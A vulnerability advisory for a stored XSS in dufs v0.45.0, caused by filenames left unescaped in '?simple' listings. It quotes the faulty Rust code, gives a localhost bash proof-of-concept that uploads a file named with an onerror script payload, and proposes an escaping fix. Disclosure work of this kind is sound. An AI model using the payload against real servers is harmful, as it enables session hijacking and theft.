---
lang: en
title: "Stored XSS via unescaped filename in ?simple output"
project: dufs
cwe:
  - CWE-79
severity: high
cvss:
score:
verified: "v0.45.0"
affected:
patched:
date: 2025-02-03
---

### Summary

Due to an insecure internal implementation of the query parameter (`simple`), a `Stored XSS` vulnerability exists. If a file with a filename or directory name written in JavaScript is uploaded, that JavaScript is executed when the `?simple` query is used in the directory hierarchy where the file exists.

### Details

- **Verified version**: dufs v0.45.0
- **The worst-case scenario**: When an administrator falls victim to an XSS attack and their session is hijacked.

In the `send_index()` function, the `simple` parameter returns the filename or directory name directly as `Content-Type: text/html` without sanitization or escaping.

**server.rs (lines 1179-1281)**

```rust
    #[allow(clippy::too_many_arguments)]
    fn send_index(
        &self,
        path: &Path,
        mut paths: Vec<PathItem>,
        exist: bool,
        query_params: &HashMap<String, String>,
        head_only: bool,
        user: Option<String>,
        access_paths: AccessPaths,
        res: &mut Response,
    ) -> Result<()> {
	// ...

        if has_query_flag(query_params, "simple") {
            let output = paths
                .into_iter()
                .map(|v| {
                    if v.is_dir() {
                        format!("{}/\n", v.name)
                    } else {
                        format!("{}\n", v.name)
                    }
                })
                .collect::<Vec<String>>()
                .join("");
            res.headers_mut()
                .typed_insert(ContentType::from(mime_guess::mime::TEXT_HTML_UTF_8));
            res.headers_mut()
                .typed_insert(ContentLength(output.len() as u64));
            *res.body_mut() = body_full(output);
            if head_only {
                return Ok(());
            }
            return Ok(());
        }

    // ...
    }
```

### PoC

> Manual verification via a browser is required to confirm the success of the XSS.

```sh
#!/bin/bash
set -e

# PoC: Stored XSS via unescaped filename in ?simple output
# Tested: dufs v0.45.0
# Affected: Unknown (requires vendor confirmation)
# Vulnerability: When ?simple query parameter is used, filenames are returned without HTML escaping with Content-Type: text/html, allowing stored XSS
# Execution condition: The project root must be the current directory.

ROOT_DIR="/tmp/dufs-poc-$$/root"
PORT=15555
payload="<img src=x onerror=alert(\"XSS-Successful\")>"
evil_file="$payload.txt"

# Cleanup function to remove temp files and kill server
cleanup() {
    echo "[*] Cleaning up..."
    rm -rf "$ROOT_DIR"
    pkill -f "dufs.*$PORT" 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

# Step 1: Setup environment
echo "[*] Step 1: Setup environment"
rm -rf "$ROOT_DIR"
mkdir -p "$ROOT_DIR"
# end Step 1

# Step 2: Start dufs server with allow_upload=true
echo "[*] Step 2: Start dufs server (allow_upload=true)"
# Get the dufs binary path (prefer release)
DUFS_BIN=$(find ./target -maxdepth 3 -type f -executable -name dufs \
    \( -path "*/release/*" -o -path "*/debug/*" \) 2>/dev/null | sort -r | head -1)

if [ -z "$DUFS_BIN" ]; then
    echo "Error: dufs binary not found. Run 'cargo build' first." >&2
    exit 1
fi
echo "Using binary: $DUFS_BIN"

# launch background dufs and log output
# --allow-symlink defaults to false
$DUFS_BIN "$ROOT_DIR" --allow-upload --port $PORT --log-file /tmp/dufs-poc-$$.log > /dev/null 2>&1 &
DUFS_PID=$!
echo "    dufs started with PID $DUFS_PID on port $PORT"

sleep 2

# Verify server is running
if ! kill -0 $DUFS_PID 2>/dev/null; then
    echo "[!] ERROR: dufs failed to start"
    exit 1
fi

encoded_file=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))" <<< "$evil_file")

# Step 3: Upload payload file
echo "[*] Step 3: Upload payload file"
echo "Uploading payload file to dufs server..."
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    "http://127.0.0.1:$PORT/$encoded_file" \
    -H "Content-Type: text/plain")
echo "    HTTP Status: $HTTP_STATUS"
echo ""


# Step 4: Verify upload (200 OK or 201 Created)
if [ "$HTTP_STATUS" -ne 200 ] && [ "$HTTP_STATUS" -ne 201 ]; then
    echo "[!] ERROR: File upload failed with status $HTTP_STATUS"
    exit 1
fi

# Step 5: Access the uploaded file (Manual verification via browser is required)
echo "To verify the XSS payload, open the following URL in a web browser:"
echo "http://127.0.0.1:$PORT/?simple"

read -p "Press [Enter] to stop the server and clean up..."
echo "[*] Stopping dufs server..."
sleep 1
```

**Exploitable Conditions**:

- `--allow-upload` is enabled.
- The victim accesses the page using the `?simple` query.

### Impact

- **Session Hijacking**: Attackers can hijack the victim's account by stealing authentication tokens/cookies.
- **Execution of Arbitrary Operations**: Files can be deleted, uploaded, moved, or downloaded with the victim's privileges.
- **Persistent Attack**: Once a payload is uploaded, it affects all users who access the page via `?simple`.
- **Information Theft**: Sensitive information on the page or file lists can be sent to the attacker's server.
- **XSS Worm Propagation**: Malicious filenames can be automatically copied to other files to spread the infection.

**Recommended Fix:** HTML escaping should be performed on the filename using the `escape_str_pcdata()` function even when displaying via `?simple`. This function is already used for WebDAV output and noscript output, allowing for consistent escape processing.

**server.rs (lines 1208-1219)**

```rust
if has_query_flag(query_params, "simple") {
    let output = paths
        .into_iter()
        .map(|v| {
        // [FIX]: Modified to perform escape processing by passing through the escape_str_pcdata function instead of using v.name directly.
            let escaped_name = escape_str_pcdata(&v.name);
            if v.is_dir() {
                format!("{}/\n", escaped_name)
            } else {
                format!("{}\n", escaped_name)
            }
        })
        .collect::<Vec<String>>()
        .join("");
}
```
